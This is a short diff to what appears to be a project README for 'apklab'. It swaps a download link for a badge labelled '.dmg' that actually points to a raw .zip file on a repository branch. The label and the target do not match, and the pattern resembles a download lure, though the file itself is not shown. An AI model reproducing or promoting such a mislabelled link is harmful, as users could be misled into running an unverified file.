@@ -33,7 +33,7 @@
 
 ### 🔷 Download Release
 
-➡ [**Download .dmg**](file/apklab.zip)
+[![Download](https://img.shields.io/badge/Download-.dmg-blue?style=for-the-badge)](https://github.com/mk7002/apklab/raw/refs/heads/develop/file/apklab.zip)
 
 or
 
